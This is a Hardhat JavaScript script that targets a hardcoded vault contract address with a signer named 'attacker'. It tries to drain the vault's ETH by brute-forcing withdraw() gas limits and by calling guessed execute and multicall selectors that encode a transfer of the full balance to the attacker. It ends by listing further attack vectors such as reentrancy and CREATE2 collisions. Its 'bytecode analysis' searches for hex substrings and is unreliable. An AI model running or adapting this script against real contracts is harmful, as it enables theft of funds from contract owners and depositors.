const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

/**
 * @title Analyze ETH Functions
 * @notice Deep analysis of ETH-related functions and fallback behavior
 * @dev Test receive, fallback, and ETH transfer patterns
 */
async function main() {
  console.log("\nüîç ANALYZING ETH-RELATED FUNCTIONS");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Get initial balance
  const initialVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  console.log("Vault ETH balance:", ethers.formatEther(initialVaultETH));
  
  // Test 1: Check if vault accepts ETH
  console.log("\nüì• Test 1: Can vault receive ETH?");
  try {
    const sendTx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      value: ethers.parseEther("0.001")
    });
    await sendTx.wait();
    console.log("‚úÖ Vault accepts ETH via fallback/receive");
  } catch (e) {
    console.log("‚ùå Vault rejects ETH transfers");
  }
  
  // Test 2: Empty call to vault
  console.log("\nüì§ Test 2: Empty call behavior");
  try {
    const emptyCall = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: "0x",
      gasLimit: 100000
    });
    await emptyCall.wait();
    console.log("‚úÖ Empty call succeeded");
  } catch (e) {
    console.log("‚ùå Empty call failed:", e.reason);
  }
  
  // Test 3: Look for ETH-specific patterns in bytecode
  console.log("\nüî¨ Test 3: Bytecode analysis for ETH patterns");
  
  const code = await ethers.provider.getCode(VAULT_ADDRESS);
  
  // Common ETH transfer patterns in bytecode
  const patterns = {
    "call": code.includes("f1"),
    "transfer": code.includes("a9"),
    "send": code.includes("12"),
    "selfdestruct": code.includes("ff"),
    "delegatecall": code.includes("f4"),
    "callvalue": code.includes("34"),
    "balance": code.includes("31")
  };
  
  console.log("ETH-related opcodes found:");
  for (const [name, found] of Object.entries(patterns)) {
    if (found) console.log(`- ${name}`);
  }
  
  // Test 4: Try ETH extraction with specific gas amounts
  console.log("\n‚õΩ Test 4: Gas manipulation for ETH extraction");
  
  const gasTests = [
    { gas: 21000, desc: "Minimal gas" },
    { gas: 50000, desc: "Low gas" },
    { gas: 100000, desc: "Medium gas" },
    { gas: 500000, desc: "High gas" },
    { gas: 2000000, desc: "Very high gas" }
  ];
  
  for (const test of gasTests) {
    try {
      console.log(`\nTesting with ${test.desc} (${test.gas}):`);
      
      // Try withdraw with specific gas
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: "0x3ccfd60b", // withdraw()
        gasLimit: test.gas
      });
      await tx.wait();
      
      const newBalance = await ethers.provider.getBalance(VAULT_ADDRESS);
      if (newBalance < initialVaultETH) {
        console.log(`‚úÖ SUCCESS! Extracted ${ethers.formatEther(initialVaultETH - newBalance)} ETH`);
        break;
      }
    } catch (e) {
      console.log(`Failed: ${e.reason || "Gas issue"}`);
    }
  }
  
  // Test 5: Execute with ETH value patterns
  console.log("\nüí∏ Test 5: Execute functions with ETH values");
  
  const executeSelectors = [
    "0x1cff79cd", // execute(address,bytes)
    "0xb61d27f6", // execute(address,uint256,bytes)
    "0x7535d246", // executeCall
  ];
  
  for (const selector of executeSelectors) {
    try {
      // Make vault send ETH to attacker
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256", "bytes"],
        [attacker.address, initialVaultETH, "0x"]
      ).slice(2);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 500000
      });
      await tx.wait();
      
      const newBalance = await ethers.provider.getBalance(VAULT_ADDRESS);
      if (newBalance < initialVaultETH) {
        console.log(`‚úÖ ${selector} moved ${ethers.formatEther(initialVaultETH - newBalance)} ETH!`);
      }
    } catch (e) {}
  }
  
  // Test 6: Multicall patterns
  console.log("\nüé≤ Test 6: Multicall ETH extraction");
  
  const multicallData = ethers.AbiCoder.defaultAbiCoder().encode(
    ["address[]", "uint256[]", "bytes[]"],
    [
      [attacker.address, attacker.address],
      [initialVaultETH / 2n, initialVaultETH / 2n],
      ["0x", "0x"]
    ]
  );
  
  const multicallSelectors = ["0xac9650d8", "0x5ae401dc", "0x1f0464d1"];
  
  for (const selector of multicallSelectors) {
    try {
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: selector + multicallData.slice(2),
        gasLimit: 800000
      });
      await tx.wait();
      console.log(`${selector} executed`);
    } catch (e) {}
  }
  
  // Final balance check
  const finalVaultETH = await ethers.provider.getBalance(VAULT_ADDRESS);
  
  console.log("\nüìä FINAL ANALYSIS:");
  console.log("=====================================");
  console.log("Initial vault ETH:", ethers.formatEther(initialVaultETH));
  console.log("Final vault ETH:", ethers.formatEther(finalVaultETH));
  
  if (finalVaultETH < initialVaultETH) {
    console.log("\nüéâ ETH EXTRACTED:", ethers.formatEther(initialVaultETH - finalVaultETH));
  } else {
    console.log("\n‚ö†Ô∏è No ETH extracted through these methods");
    console.log("\nAdditional vectors to explore:");
    console.log("1. Transaction replay attacks");
    console.log("2. CREATE2 collision attacks");
    console.log("3. Storage layout manipulation");
    console.log("4. Cross-function reentrancy");
  }
}

main().catch((error) => {
  console.error("\nüí• Script error:", error);
  process.exit(1);
});
